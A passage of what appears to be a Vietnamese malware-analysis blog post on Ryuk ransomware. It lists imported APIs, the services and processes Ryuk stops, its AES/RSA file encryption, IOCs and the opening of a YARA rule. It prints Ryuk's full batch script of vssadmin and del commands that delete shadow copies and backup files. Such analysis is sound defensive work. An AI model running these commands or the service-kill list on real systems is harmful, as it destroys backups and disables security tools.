+<p>Ryuk import các function cần thiết một cách động bằng <code>LoadLibraryA()</code> và <code>GetProcAddress()</code>. Tên các function bị obfuscate nên static analysis sẽ không hiệu quả lắm ở đây.</p>
+<p>Chúng ta có thể sử dụng debugger để lấy các tên này thay vì reverse obfuscation algorithm.</p>
+<p>Đây là danh sách các function được import:</p>
+<h4 id="advapi32-dll">advapi32.dll<a class="zola-anchor" href="#advapi32-dll" aria-label="Anchor link for: advapi32-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>CryptAcquireContextW</li>
+<li>CryptDecrypt</li>
+<li>CryptDeriveKey</li>
+<li>CryptDestroyKey</li>
+<li>CryptEncrypt</li>
+<li>CryptExportKey</li>
+<li>CryptGenKey</li>
+<li>CryptImportKey</li>
+<li>GetUserNameA</li>
+<li>GetUserNameW</li>
+<li>RegCloseKey</li>
+<li>RegDeleteValueW</li>
+<li>RegOpenKeyExA</li>
+<li>RegOpenKeyExW</li>
+<li>RegQueryValueExA</li>
+<li>RegSetValueExW</li>
+</ul>
+<h4 id="kernel32-dll">kernel32.dll<a class="zola-anchor" href="#kernel32-dll" aria-label="Anchor link for: kernel32-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>CloseHandle</li>
+<li>CopyFileA</li>
+<li>CopyFileW</li>
+<li>CreateDirectoryW</li>
+<li>CreateFileA</li>
+<li>CreateFileW</li>
+<li>CreateProcessA</li>
+<li>CreateProcessW</li>
+<li>DeleteFileW</li>
+<li>ExitProcess</li>
+<li>FindClose</li>
+<li>FindFirstFileW</li>
+<li>FindNextFileW</li>
+<li>FreeLibrary</li>
+<li>GetCommandLineW</li>
+<li>GetCurrentProcess</li>
+<li>GetDriveTypeW</li>
+<li>GetFileAttributesA</li>
+<li>GetFileAttributesW</li>
+<li>GetFileSize</li>
+<li>GetLogicalDrives</li>
+<li>GetModuleFileNameA</li>
+<li>GetModuleFileNameW</li>
+<li>GetModuleHandleA</li>
+<li>GetStartupInfoW</li>
+<li>GetTickCount</li>
+<li>GetVersionExW</li>
+<li>GetWindowsDirectoryW</li>
+<li>GlobalAlloc</li>
+<li>LoadLibraryA</li>
+<li>ReadFile</li>
+<li>SetFileAttributesA</li>
+<li>SetFileAttributesW</li>
+<li>SetFilePointer</li>
+<li>Sleep</li>
+<li>VirtualAlloc</li>
+<li>VirtualFree</li>
+<li>WinExec</li>
+<li>Wow64DisableWow64FsRedirection</li>
+<li>Wow64RevertWow64FsRedirection</li>
+<li>WriteFile</li>
+</ul>
+<h4 id="ole32-dll">ole32.dll<a class="zola-anchor" href="#ole32-dll" aria-label="Anchor link for: ole32-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>CoCreateInstance</li>
+<li>CoInitialize</li>
+</ul>
+<h4 id="shell32-dll">Shell32.dll<a class="zola-anchor" href="#shell32-dll" aria-label="Anchor link for: shell32-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>ShellExecuteA</li>
+<li>ShellExecuteW</li>
+</ul>
+<h4 id="mpr-dll">mpr.dll<a class="zola-anchor" href="#mpr-dll" aria-label="Anchor link for: mpr-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>WNetCloseEnum</li>
+<li>WNetEnumResourceW</li>
+<li>WNetOpenEnumW</li>
+</ul>
+<h4 id="iphlpapi-dll">Iphlpapi.dll<a class="zola-anchor" href="#iphlpapi-dll" aria-label="Anchor link for: iphlpapi-dll" style="visibility: hidden;"></a></h4>
+<ul>
+<li>GetIpNetTable</li>
+</ul>
+<h3 id="killing-processes-don-duong-cho-cuoc-tan-cong">Killing Processes: "Dọn Đường" Cho Cuộc Tấn Công<a class="zola-anchor" href="#killing-processes-don-duong-cho-cuoc-tan-cong" aria-label="Anchor link for: killing-processes-don-duong-cho-cuoc-tan-cong" style="visibility: hidden;"></a></h3>
+<p>Ryuk có một danh sách dài các service và process định sẵn để "thanh lý" bằng <code>net stop</code> và <code>taskkill /IM</code> tương ứng.</p>
+<h4 id="danh-sach-services">Danh sách Services<a class="zola-anchor" href="#danh-sach-services" aria-label="Anchor link for: danh-sach-services" style="visibility: hidden;"></a></h4>
+<ul>
+<li>Acronis VSS Provider</li>
+<li>Enterprise Client Service</li>
+<li>Sophos Agent</li>
+<li>Sophos AutoUpdate Service</li>
+<li>Sophos Clean Service</li>
+<li>Sophos Device Control Service</li>
+<li>Sophos File Scanner Service</li>
+<li>Sophos Health Service</li>
+<li>Sophos MCS Agent</li>
+<li>Sophos MCS Client</li>
+<li>Sophos Message Router</li>
+<li>Sophos Safestore Service</li>
+<li>Sophos System Protection Service</li>
+<li>Sophos Web Control Service</li>
+<li>SQLsafe Backup Service</li>
+<li>SQLsafe Filter Service</li>
+<li>Symantec System Recovery</li>
+<li>Veeam Backup Catalog Data Service</li>
+<li>AcronisAgent</li>
+<li>AcrSch2Svc</li>
+<li>Antivirus</li>
+<li>ARSM</li>
+<li>BackupExecAgentAccelerator</li>
+<li>BackupExecAgentBrowser</li>
+<li>BackupExecDeviceMediaService</li>
+<li>BackupExecJobEngine</li>
+<li>BackupExecManagementService</li>
+<li>BackupExecRPCService</li>
+<li>BackupExecVSSProvider</li>
+<li>bedbg</li>
+<li>DCAgent</li>
+<li>EPSecurityService</li>
+<li>EPUpdateService</li>
+<li>EraserSvc11710</li>
+<li>EsgShKernel</li>
+<li>FA_Scheduler</li>
+<li>IISAdmin</li>
+<li>IMAP4Svc</li>
+<li>macmnsvc</li>
+<li>masvc</li>
+<li>MBAMService</li>
+<li>MBEndpointAgent</li>
+<li>McAfeeEngineService</li>
+<li>McAfeeFramework</li>
+<li>McShield</li>
+<li>McTaskManager</li>
+<li>mfemms</li>
+<li>mfevtp</li>
+<li>MMS</li>
+<li>mozyprobackup</li>
+<li>MsDtsServer</li>
+<li>MsDtsServer100</li>
+<li>MsDtsServer110</li>
+<li>MSExchangeES</li>
+<li>MSExchangeIS</li>
+<li>MSExchangeMGMT</li>
+<li>MSExchangeMTA</li>
+<li>MSExchangeSA</li>
+<li>MSExchangeSRS</li>
+<li>MSOLAP$SQL_2008</li>
+<li>MSOLAP$SYSTEM_BGC</li>
+<li>MSOLAP$TPS</li>
+<li>MSOLAP$TPSAMA</li>
+<li>MSSQL$BKUPEXEC</li>
+<li>MSSQL$ECWDB2</li>
+<li>MSSQL$PRACTICEMGT</li>
+<li>MSSQL$PRACTTICEBGC</li>
+<li>MSSQL$PROFXENGAGEMENT</li>
+<li>MSSQL$SBSMONITORING</li>
+<li>MSSQL$SHAREPOINT</li>
+<li>MSSQL$SQL_2008</li>
+<li>MSSQL$SYSTEM_BGC</li>
+<li>MSSQL$TPS</li>
+<li>MSSQL$TPSAMA</li>
+<li>MSSQL$VEEAMSQL2008R2</li>
+<li>MSSQL$VEEAMSQL2012</li>
+<li>MSSQLFDLauncher</li>
+<li>MSSQLFDLauncher$PROFXENGAGEMENT</li>
+<li>MSSQLFDLauncher$SBSMONITORING</li>
+<li>MSSQLFDLauncher$SHAREPOINT</li>
+<li>MSSQLFDLauncher$SQL_2008</li>
+<li>MSSQLFDLauncher$SYSTEM_BGC</li>
+<li>MSSQLFDLauncher$TPS</li>
+<li>MSSQLFDLauncher$TPSAMA</li>
+<li>MSSQLSERVER</li>
+<li>MSSQLServerADHelper100</li>
+<li>MSSQLServerOLAPService</li>
+<li>MySQL80</li>
+<li>MySQL57</li>
+<li>ntrtscan</li>
+<li>OracleClientCache80</li>
+<li>PDVFSService</li>
+<li>POP3Svc</li>
+<li>ReportServer</li>
+<li>ReportServer$SQL_2008</li>
+<li>ReportServer$SYSTEM_BGC</li>
+<li>ReportServer$TPS</li>
+<li>ReportServer$TPSAMA</li>
+<li>RESvc</li>
+<li>sacsvr</li>
+<li>SamSs</li>
+<li>SAVAdminService</li>
+<li>SAVService</li>
+<li>SDRSVC</li>
+<li>SepMasterService</li>
+<li>ShMonitor</li>
+<li>Smcinst</li>
+<li>SmcService</li>
+<li>SMTPSvc</li>
+<li>SNAC</li>
+<li>SntpService</li>
+<li>sophossps</li>
+<li>SQLAgent$BKUPEXEC</li>
+<li>SQLAgent$ECWDB2</li>
+<li>SQLAgent$PRACTTICEBGC</li>
+<li>SQLAgent$PRACTTICEMGT</li>
+<li>SQLAgent$PROFXENGAGEMENT</li>
+<li>SQLAgent$SBSMONITORING</li>
+<li>SQLAgent$SHAREPOINT</li>
+<li>SQLAgent$SQL_2008</li>
+<li>SQLAgent$SYSTEM_BGC</li>
+<li>SQLAgent$TPS</li>
+<li>SQLAgent$TPSAMA</li>
+<li>SQLAgent$VEEAMSQL2008R2</li>
+<li>SQLAgent$VEEAMSQL2012</li>
+<li>SQLBrowser</li>
+<li>SQLSafeOLRService</li>
+<li>SQLSERVERAGENT</li>
+<li>SQLTELEMETRY</li>
+<li>SQLTELEMETRY$ECWDB2</li>
+<li>SQLWriter</li>
+<li>SstpSvc</li>
+<li>svcGenericHost</li>
+<li>swi_filter</li>
+<li>swi_service</li>
+<li>swi_update_64</li>
+<li>TmCCSF</li>
+<li>tmlisten</li>
+<li>TrueKey</li>
+<li>TrueKeyScheduler</li>
+<li>TrueKeyServiceHelper</li>
+<li>UI0Detect</li>
+<li>VeeamBackupSvc</li>
+<li>VeeamBrokerSvc</li>
+<li>VeeamCatalogSvc</li>
+<li>VeeamCloudSvc</li>
+<li>VeeamDeploymentService</li>
+<li>VeeamDeploySvc</li>
+<li>VeeamEnterpriseManagerSvc</li>
+<li>VeeamMountSvc</li>
+<li>VeeamNFSSvc</li>
+<li>VeeamRESTSvc</li>
+<li>VeeamTransportSvc</li>
+<li>W3Svc</li>
+<li>wbengine</li>
+<li>WRSVC</li>
+<li>VeeamHvIntegrationSvc</li>
+<li>swi_update</li>
+<li>SQLAgent$CXDB</li>
+<li>SQLAgent$CITRIX_METAFRAME</li>
+<li>SQL Backups</li>
+<li>MSSQL$PROD</li>
+<li>Zoolz 2 Service</li>
+<li>MSSQLServerADHelper</li>
+<li>SQLAgent$PROD</li>
+<li>msftesql$PROD</li>
+<li>NetMsmqActivator</li>
+<li>EhttpSrv</li>
+<li>ekrn</li>
+<li>ESHASRV</li>
+<li>MSSQL$SOPHOS</li>
+<li>SQLAgent$SOPHOS</li>
+<li>AVP</li>
+<li>klnagent</li>
+<li>MSSQL$SQLEXPRESS</li>
+<li>SQLAgent$SQLEXPRESS</li>
+<li>wbengine</li>
+<li>kavfsslp</li>
+<li>KAVFSGT</li>
+<li>KAVFS</li>
+<li>mfefire</li>
+</ul>
+<h4 id="danh-sach-processes">Danh sách Processes<a class="zola-anchor" href="#danh-sach-processes" aria-label="Anchor link for: danh-sach-processes" style="visibility: hidden;"></a></h4>
+<ul>
+<li>zoolz.exe</li>
+<li>agntsvc.exe</li>
+<li>dbeng50.exe</li>
+<li>dbsnmp.exe</li>
+<li>encsvc.exe</li>
+<li>excel.exe</li>
+<li>firefoxconfig.exe</li>
+<li>infopath.exe</li>
+<li>isqlplussvc.exe</li>
+<li>msaccess.exe</li>
+<li>msftesql.exe</li>
+<li>mspub.exe</li>
+<li>mydesktopqos.exe</li>
+<li>mydesktopservice.exe</li>
+<li>mysqld.exe</li>
+<li>mysqld-nt.exe</li>
+<li>mysqld-opt.exe</li>
+<li>ocautoupds.exe</li>
+<li>ocomm.exe</li>
+<li>ocssd.exe</li>
+<li>onenote.exe</li>
+<li>oracle.exe</li>
+<li>outlook.exe</li>
+<li>powerpnt.exe</li>
+<li>sqbcoreservice.exe</li>
+<li>sqlagent.exe</li>
+<li>sqlbrowser.exe</li>
+<li>sqlservr.exe</li>
+<li>sqlwriter.exe</li>
+<li>steam.exe</li>
+<li>synctime.exe</li>
+<li>tbirdconfig.exe</li>
+<li>thebat.exe</li>
+<li>thebat64.exe</li>
+<li>thunderbird.exe</li>
+<li>visio.exe</li>
+<li>winword.exe</li>
+<li>wordpad.exe</li>
+<li>xfssvccon.exe</li>
+<li>tmlisten.exe</li>
+<li>PccNTMon.exe</li>
+<li>CNTAoSMgr.exe</li>
+<li>Ntrtscan.exe</li>
+<li>mbamtray.exe</li>
+</ul>
+<h3 id="deleting-backups-dot-cau-de-rut-lui">Deleting Backups: "Đốt Cầu Để Rút Lui"<a class="zola-anchor" href="#deleting-backups-dot-cau-de-rut-lui" aria-label="Anchor link for: deleting-backups-dot-cau-de-rut-lui" style="visibility: hidden;"></a></h3>
+<p>Ryuk thả một batch script tại <code>C:\Users\Public\window.bat</code> để xóa tất cả shadow copies và backup có thể, sau đó script tự xóa chính nó:</p>
+<p><img src="/img/2024/10/delback.png" alt="alt text" /></p>
+<p>Cụ thể các lệnh là:</p>
+<pre data-lang="bash" class="language-bash z-code"><code class="language-bash" data-lang="bash"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> Delete Shadows /all /quiet</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=c: /on=c: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=c: /on=c: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=d: /on=d: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=d: /on=d: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=e: /on=e: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=e: /on=e: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=f: /on=f: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=f: /on=f: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=g: /on=g: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=g: /on=g: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=h: /on=h: /maxsize=401MB</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> resize shadowstorage /for=h: /on=h: /maxsize=unbounded</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">vssadmin</span></span><span class="z-meta z-function-call z-arguments z-shell"> Delete Shadows /all /quiet</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q c:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD c:<span class="z-constant z-character z-escape z-shell">\*</span>.bac c:<span class="z-constant z-character z-escape z-shell">\*</span>.bak c:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat c:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf c:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> c:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> c:<span class="z-constant z-character z-escape z-shell">\*</span>.set c:<span class="z-constant z-character z-escape z-shell">\*</span>.win c:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q d:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD d:<span class="z-constant z-character z-escape z-shell">\*</span>.bac d:<span class="z-constant z-character z-escape z-shell">\*</span>.bak d:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat d:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf d:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> d:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> d:<span class="z-constant z-character z-escape z-shell">\*</span>.set d:<span class="z-constant z-character z-escape z-shell">\*</span>.win d:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q e:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD e:<span class="z-constant z-character z-escape z-shell">\*</span>.bac e:<span class="z-constant z-character z-escape z-shell">\*</span>.bak e:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat e:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf e:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> e:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> e:<span class="z-constant z-character z-escape z-shell">\*</span>.set e:<span class="z-constant z-character z-escape z-shell">\*</span>.win e:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q f:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD f:<span class="z-constant z-character z-escape z-shell">\*</span>.bac f:<span class="z-constant z-character z-escape z-shell">\*</span>.bak f:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat f:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf f:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> f:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> f:<span class="z-constant z-character z-escape z-shell">\*</span>.set f:<span class="z-constant z-character z-escape z-shell">\*</span>.win f:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q g:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD g:<span class="z-constant z-character z-escape z-shell">\*</span>.bac g:<span class="z-constant z-character z-escape z-shell">\*</span>.bak g:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat g:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf g:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> g:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> g:<span class="z-constant z-character z-escape z-shell">\*</span>.set g:<span class="z-constant z-character z-escape z-shell">\*</span>.win g:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> /s /f /q h:<span class="z-constant z-character z-escape z-shell">\*</span>.VHD h:<span class="z-constant z-character z-escape z-shell">\*</span>.bac h:<span class="z-constant z-character z-escape z-shell">\*</span>.bak h:<span class="z-constant z-character z-escape z-shell">\*</span>.wbcat h:<span class="z-constant z-character z-escape z-shell">\*</span>.bkf h:<span class="z-constant z-character z-escape z-shell">\B</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> h:<span class="z-constant z-character z-escape z-shell">\b</span>ackup<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span>.<span class="z-keyword z-operator z-regexp z-quantifier z-shell">*</span> h:<span class="z-constant z-character z-escape z-shell">\*</span>.set h:<span class="z-constant z-character z-escape z-shell">\*</span>.win h:<span class="z-constant z-character z-escape z-shell">\*</span>.dsk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">del</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-job z-shell"><span class="z-punctuation z-definition z-variable z-job z-shell">%</span><span class="z-constant z-numeric z-integer z-decimal z-job z-shell">0</span></span></span>
+</span></code></pre>
+<h2 id="the-encryption-process-khi-toc-do-la-vua">The Encryption Process: Khi Tốc Độ Là Vua<a class="zola-anchor" href="#the-encryption-process-khi-toc-do-la-vua" aria-label="Anchor link for: the-encryption-process-khi-toc-do-la-vua" style="visibility: hidden;"></a></h2>
+<p>Ryuk sử dụng approach multi-threading cho quá trình mã hóa - tạo thread mới cho mỗi file, làm cho nó cực kỳ nhanh.</p>
+<p>Nó bắt đầu enumerate files bằng <code>FindFirstFileExA()</code> và <code>FindNextFileA()</code>, sau đó truyền mỗi tên file cho một encryption thread mới. Lưu ý rằng Ryuk tránh mã hóa các file extension sau:</p>
+<ul>
+<li><code>.dll</code></li>
+<li><code>.lnk</code></li>
+<li><code>.hrmlog</code></li>
+<li><code>.ini</code></li>
+<li><code>.exe</code></li>
+</ul>
+<h3 id="chi-tiet-encryption-thread">Chi Tiết Encryption Thread<a class="zola-anchor" href="#chi-tiet-encryption-thread" aria-label="Anchor link for: chi-tiet-encryption-thread" style="visibility: hidden;"></a></h3>
+<p>Mỗi encryption thread bắt đầu bằng việc tạo random 256-bit AES encryption key bằng <code>CryptGenKey()</code>. Ryuk sử dụng Windows Crypto API cho việc mã hóa.</p>
+<p><img src="/img/2024/10/crypt.png" alt="alt text" /></p>
+<p>Sau đó nó đi vào vòng lặp mã hóa điển hình, các file được mã hóa theo chunks với kích thước chunk là 1,000,000 bytes.</p>
+<p><img src="/img/2024/10/loop.png" alt="alt text" /></p>
+<p><img src="/img/2024/10/loop2.png" alt="alt text" /></p>
+<p>Cuối cùng, Ryuk ghi một metadata block có kích thước 274 bytes vào cuối file. 6 bytes đầu tiên là keyword <code>HERMES</code>.</p>
+<p><img src="/img/2024/10/hermes.png" alt="alt text" /></p>
+<p>Sau đó, AES key được mã hóa bằng RSA public key trước khi được ghi vào cuối file và sau đó export bằng <code>CryptExportKey()</code>. Function này tạo ra 12 bytes thông tin Blob + 256 bytes (encrypted key).</p>
+<p><img src="/img/2024/10/aes.png" alt="alt text" /></p>
+<p>RSA public key được nhúng trong executable, nó được import bằng <code>CryptImportKey()</code> và truyền cho mỗi encryption thread.</p>
+<p><img src="/img/2024/10/pub.png" alt="alt text" /></p>
+<p>Chúng ta có thể thấy ở cuối encryption routine có một check xem keyword <code>HERMES</code> có xuất hiện ở cuối file không (điều này cho biết file đã được mã hóa).</p>
+<p>Check này thực sự được thực hiện trước khi mã hóa file để tránh mã hóa nó hai lần.</p>
+<p><img src="/img/2024/10/hermescheck.png" alt="alt text" /></p>
+<p>Phần footer của 1 file bị mã hóa:</p>
+<p><img src="/img/2024/10/foot.png" alt="alt text" /></p>
+<h3 id="encrypting-network-shares-mo-rong-tam-anh-huong">Encrypting Network Shares: Mở Rộng Tầm Ảnh Hưởng<a class="zola-anchor" href="#encrypting-network-shares-mo-rong-tam-anh-huong" aria-label="Anchor link for: encrypting-network-shares-mo-rong-tam-anh-huong" style="visibility: hidden;"></a></h3>
+<p>Ryuk enumerate network shares bằng <code>WNetOpenEnumW()</code> và <code>WNetEnumResourceA()</code> tương ứng.</p>
+<p><img src="/img/2024/10/netenum.png" alt="alt text" /></p>
+<p>Đối với mỗi network resource được tìm thấy, tên của resource sẽ được thêm vào một danh sách được phân tách bằng dấu chấm phẩy. Danh sách này sẽ được sử dụng sau để mã hóa các network share này với cùng quy trình mã hóa như trên.</p>
+<h2 id="iocs-indicators-of-compromise">IOCs (Indicators of Compromise)<a class="zola-anchor" href="#iocs-indicators-of-compromise" aria-label="Anchor link for: iocs-indicators-of-compromise" style="visibility: hidden;"></a></h2>
+<h3 id="hashes">Hashes<a class="zola-anchor" href="#hashes" aria-label="Anchor link for: hashes" style="visibility: hidden;"></a></h3>
+<ul>
+<li><strong>Ryuk</strong>: <code>8b0a5fb13309623c3518473551cb1f55d38d8450129d4a3c16b476f7b2867d7</code></li>
+<li><strong>Dropper</strong>: <code>23f8aa94ffb3c08a62735fe7fee5799880a8f322ce1d55ec49a13a3f85312db2</code></li>
+</ul>
+<h3 id="files">Files<a class="zola-anchor" href="#files" aria-label="Anchor link for: files" style="visibility: hidden;"></a></h3>
+<ul>
+<li><code>C:\Users\Public\window.bat</code></li>
+</ul>
+<h3 id="registry">Registry<a class="zola-anchor" href="#registry" aria-label="Anchor link for: registry" style="visibility: hidden;"></a></h3>
+<ul>
+<li><code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li>
+</ul>
+<h3 id="emails">Emails<a class="zola-anchor" href="#emails" aria-label="Anchor link for: emails" style="visibility: hidden;"></a></h3>
+<ul>
+<li>WayneEvenson@protonmail[.]com</li>
+<li>WayneEvenson@tutanota[.]com</li>
+</ul>
+<h2 id="yara-rule">Yara Rule<a class="zola-anchor" href="#yara-rule" aria-label="Anchor link for: yara-rule" style="visibility: hidden;"></a></h2>
+<pre data-lang="bash" class="language-bash z-code"><code class="language-bash" data-lang="bash"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">rule</span></span><span class="z-meta z-function-call z-arguments z-shell"> Ryuk</span>
+</span><span class="z-source z-shell z-bash"><span class="z-punctuation z-definition z-compound z-braces z-begin z-shell">{</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">meta:</span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">author</span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>N1ght-W0lf<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">description</span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Detect Ryuk Samples<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">date</span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>2020-05-08<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">strings:</span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s1</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>RyukReadMe.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
